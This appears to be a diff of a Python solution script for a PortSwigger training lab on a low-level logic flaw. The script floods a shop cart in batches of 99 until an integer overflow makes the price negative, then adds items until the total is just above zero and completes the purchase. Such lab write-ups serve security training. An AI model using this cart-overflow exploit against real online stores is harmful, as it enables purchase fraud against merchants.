@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
-# Lab: High-level logic vulnerability
-# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level
-# Difficulty: APPRENTICE
+# Lab: Low-level logic flaw
+# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level
+# Difficulty: PRACTITIONER
 from bs4 import BeautifulSoup
 import math
 import requests
@@ -25,6 +25,7 @@ def login(client, url):
 
 def get_details(text):
     soup = BeautifulSoup(text, 'html.parser')
+    print
     jacket = soup.find('img', attrs={'src': '/image/productcatalog/specialproducts/LeetLeatherJacket.jpg'})
     ret = {}
     ret['jacket'] = {'price': jacket.parent.contents[6].strip().lstrip('$'),
@@ -38,10 +39,18 @@ def get_details(text):
 
 
 def add_to_cart(client, url, item, amount):
-    print(f'[+] Adding {amount} {item["name"]} to cart')
-    data = {'productId': item['product_id'],
-            'quantity': amount, 'redir': 'CART'}
-    client.post(url, data=data, allow_redirects=False)
+    def perform_request(client, url, item, amount):
+        data = {'productId': item['product_id'],
+                'quantity': amount,
+                'redir': 'CART'}
+        client.post(url, data=data, allow_redirects=False)
+
+    print(f'[+] Adding {item["name"]} to cart ', end='\r')
+    for i in range(0, math.floor(amount / 99)):
+        perform_request(client, url, item, 99)
+        print(f'[+] Adding {item["name"]} to cart: {(i+1)*99} / {amount}', end='\r')
+    perform_request(client, url, item, amount % 99)
+    print(f'[+] Adding {item["name"]} to cart: {amount} / {amount}')
 
 
 def purchase(client, url):
@@ -71,11 +80,11 @@ def main():
 
     res = client.get(host)
     details = get_details(res.text)
+    add_to_cart(client, f'{host}/cart', details['jacket'], 32123)
 
-    add_to_cart(client, f'{host}/cart', details['jacket'], 1)
-
-    required_amount = - math.floor(float(details['jacket']['price']) /
-                                   float(details['other']['price']))
+    # Adding 32123 jackets brings the price to $-1221.96, so find the number
+    # of items required to bring the price above zero
+    required_amount = - math.floor(-1221.96 / float(details['other']['price']))
     add_to_cart(client, f'{host}/cart', details['other'], required_amount)
 
     print(f'[+] Attempting purchase')
